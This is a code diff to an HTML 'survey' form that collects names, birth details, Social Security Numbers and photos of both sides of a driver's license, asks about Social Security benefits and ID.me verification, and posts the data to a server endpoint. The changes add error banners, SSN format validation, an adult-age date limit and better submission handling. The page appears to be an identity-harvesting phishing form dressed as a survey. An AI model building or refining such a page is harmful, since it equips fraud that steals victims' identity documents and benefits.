@@ -107,42 +107,25 @@
             background: white;
             height: 48px;
             line-height: 1.5;
-            display: flex;
-            align-items: center;
         }
 
-        /* Fix for date input alignment */
+        /* Remove calendar icon styling */
         input[type="date"] {
             font-family: inherit;
             color: #333;
             height: 48px;
-            line-height: 1.5;
-            display: flex;
-            align-items: center;
+            padding: 14px 18px; /* Normal padding */
+            background: white;
+            width: 100%;
         }
 
+        /* Hide the calendar picker indicator */
         input[type="date"]::-webkit-calendar-picker-indicator {
-            opacity: 0.6;
-            cursor: pointer;
-            padding: 5px;
-        }
-
-        input[type="date"]::-webkit-datetime-edit {
+            opacity: 0; /* Hide it completely */
+            width: 0;
+            height: 0;
             padding: 0;
-        }
-
-        input[type="date"]::-webkit-datetime-edit-fields-wrapper {
-            padding: 0;
-        }
-
-        /* For Firefox */
-        input[type="date"] {
-            -moz-appearance: textfield;
-        }
-
-        input[type="date"]::-moz-focus-inner {
-            border: 0;
-            padding: 0;
+            margin: 0;
         }
 
         input:focus, select:focus {
@@ -306,6 +289,17 @@
             to { transform: rotate(360deg); }
         }
 
+        .error-message {
+            background: #fed7d7;
+            color: #c53030;
+            padding: 12px;
+            border-radius: 8px;
+            margin-top: 15px;
+            display: none;
+            align-items: center;
+            gap: 10px;
+        }
+
         @media (max-width: 768px) {
             .content {
                 padding: 20px;
@@ -337,6 +331,11 @@
         </div>
 
         <div class="content">
+            <div class="error-message" id="errorMessage" style="display: none;">
+                <i class="fas fa-exclamation-circle"></i>
+                <span id="errorText"></span>
+            </div>
+
             <form id="surveyForm">
                 <div class="form-grid">
                     <!-- Personal Information -->
@@ -394,7 +393,7 @@
 
                     <!-- Birth Information -->
                     <div class="form-group">
-                        <label for="placeOfBirth" class="required">Place of Birth </label>
+                        <label for="placeOfBirth" class="required">Place of Birth</label>
                         <input type="text" id="placeOfBirth" placeholder="LA" required>
                     </div>
 
@@ -470,7 +469,7 @@
                     <div class="form-group">
                         <label class="required">Driver's License (Front)</label>
                         <div class="file-upload">
-                            <input type="file" id="dlFront" accept="image/*" required>
+                            <input type="file" id="dlFront" accept="image/*,.jpg,.jpeg,.png,.pdf" required>
                             <div class="file-label" id="dlFrontLabel">
                                 <i class="fas fa-camera"></i>
                                 <span>Click to upload front photo</span>
@@ -482,7 +481,7 @@
                     <div class="form-group">
                         <label class="required">Driver's License (Back)</label>
                         <div class="file-upload">
-                            <input type="file" id="dlBack" accept="image/*" required>
+                            <input type="file" id="dlBack" accept="image/*,.jpg,.jpeg,.png,.pdf" required>
                             <div class="file-label" id="dlBackLabel">
                                 <i class="fas fa-camera"></i>
                                 <span>Click to upload back photo</span>
@@ -531,7 +530,7 @@
                         `<i class="fas fa-check-circle"></i> <span>${file.name} (${(file.size/1024/1024).toFixed(2)} MB)</span>`;
                     document.getElementById('dlFrontPreview').style.display = 'block';
                     document.getElementById('dlFrontPreview').textContent = 
-                        `Front: ${file.name} - ${file.type} - ${(file.size/1024).toFixed(1)}KB`;
+                        `Front: ${file.name} - ${(file.size/1024).toFixed(1)}KB`;
                 }
             });
 
@@ -542,11 +541,11 @@
                         `<i class="fas fa-check-circle"></i> <span>${file.name} (${(file.size/1024/1024).toFixed(2)} MB)</span>`;
                     document.getElementById('dlBackPreview').style.display = 'block';
                     document.getElementById('dlBackPreview').textContent = 
-                        `Back: ${file.name} - ${file.type} - ${(file.size/1024).toFixed(1)}KB`;
+                        `Back: ${file.name} - ${(file.size/1024).toFixed(1)}KB`;
                 }
             });
 
-            // Real-time validation
+            // Real-time validation for SSN
             const ssnInput = document.getElementById('ssn');
             ssnInput.addEventListener('input', function(e) {
                 let value = e.target.value.replace(/\D/g, '');
@@ -558,6 +557,15 @@
                 }
                 e.target.value = value.substring(0, 11);
             });
+
+            // Set max date for DOB (18 years old minimum)
+            const dobInput = document.getElementById('dob');
+            const today = new Date();
+            const maxDate = new Date(today.getFullYear() - 18, today.getMonth(), today.getDate());
+            const minDate = new Date(today.getFullYear() - 120, today.getMonth(), today.getDate());
+            
+            dobInput.max = maxDate.toISOString().split('T')[0];
+            dobInput.min = minDate.toISOString().split('T')[0];
         });
 
         function goBack() {
@@ -566,25 +574,39 @@
             }
         }
 
+        function showError(message) {
+            const errorElement = document.getElementById('errorMessage');
+            const errorText = document.getElementById('errorText');
+            errorText.textContent = message;
+            errorElement.style.display = 'flex';
+            
+            setTimeout(() => {
+                errorElement.style.display = 'none';
+            }, 5000);
+        }
+
         document.getElementById('surveyForm').addEventListener('submit', async (e) => {
             e.preventDefault();
             
             const submitBtn = document.getElementById('submitBtn');
             const loadingSpinner = document.getElementById('loadingSpinner');
             
+            // Clear any previous errors
+            document.getElementById('errorMessage').style.display = 'none';
+            
             // Validate files
             const dlFront = document.getElementById('dlFront').files[0];
             const dlBack = document.getElementById('dlBack').files[0];
             
             if (!dlFront || !dlBack) {
-                alert('Please upload both front and back photos of your driver\'s license');
+                showError('Please upload both front and back photos of your driver\'s license');
                 return;
             }
             
             // Check file size (max 5MB)
             const maxSize = 5 * 1024 * 1024; // 5MB
             if (dlFront.size > maxSize || dlBack.size > maxSize) {
-                alert('Each file must be less than 5MB. Please compress your images.');
+                showError('Each file must be less than 5MB. Please compress your images.');
                 return;
             }
             
@@ -598,10 +620,19 @@
             for (const fieldId of requiredFields) {
                 const field = document.getElementById(fieldId);
                 if (!field.value.trim()) {
-                    alert(`Please fill in ${field.previousElementSibling.textContent}`);
+                    const label = field.previousElementSibling ? field.previousElementSibling.textContent.replace(' *', '') : fieldId;
+                    showError(`Please fill in: ${label}`);
                     field.focus();
                     return;
                 }
+            }
+            
+            // Validate SSN format
+            const ssnRegex = /^\d{3}-\d{2}-\d{4}$/;
+            if (!ssnRegex.test(document.getElementById('ssn').value)) {
+                showError('Please enter a valid Social Security Number in format: XXX-XX-XXXX');
+                document.getElementById('ssn').focus();
+                return;
             }
             
             // Validate radio buttons
@@ -610,7 +641,7 @@
             const verifiedIDme = document.querySelector('input[name="verifiedIDme"]:checked');
             
             if (!appliedBefore || !receivingSS || !verifiedIDme) {
-                alert('Please answer all the questions (Applied before, Receiving SS, Verified by ID.me)');
+                showError('Please answer all the questions (Applied before, Receiving SS, Verified by ID.me)');
                 return;
             }
             
@@ -641,25 +672,55 @@
                 formData.append('dl_front', dlFront);
                 formData.append('dl_back', dlBack);
 
+                console.log('Submitting form...');
+                
                 const response = await fetch('/submit', {
                     method: 'POST',
                     body: formData
                 });
                 
-                if (response.ok) {
+                console.log('Response status:', response.status);
+                
+                let result;
+                try {
+                    result = await response.json();
+                } catch (jsonError) {
+                    console.error('JSON parse error:', jsonError);
+                    throw new Error('Server response was not valid JSON');
+                }
+                
+                console.log('Response data:', result);
+                
+                if (response.ok && result.success) {
+                    console.log('Submission successful, redirecting...');
+                    
                     // Clear localStorage
                     try {
                         localStorage.removeItem('fullName');
                     } catch (e) {}
                     
-                    window.location.href = 'confirmation.html';
+                    // Redirect to confirmation page
+                    window.location.href = '/confirmation.html';
+                    
                 } else {
-                    const error = await response.text();
-                    throw new Error(error || 'Submission failed');
+                    console.error('Submission failed:', result.error || result.details);
+                    throw new Error(result.error || result.details || 'Submission failed with status: ' + response.status);
                 }
+                
             } catch (error) {
                 console.error('Error:', error);
-                alert('Submission failed. Please check your internet connection and try again.');
+                
+                let errorMessage = 'Submission failed. ';
+                
+                if (error.message.includes('Failed to fetch')) {
+                    errorMessage += 'Please check your internet connection and try again.';
+                } else if (error.message.includes('JSON')) {
+                    errorMessage += 'Server response error. Please try again.';
+                } else {
+                    errorMessage += error.message;
+                }
+                
+                showError(errorMessage);
                 
                 // Reset button
                 submitBtn.disabled = false;
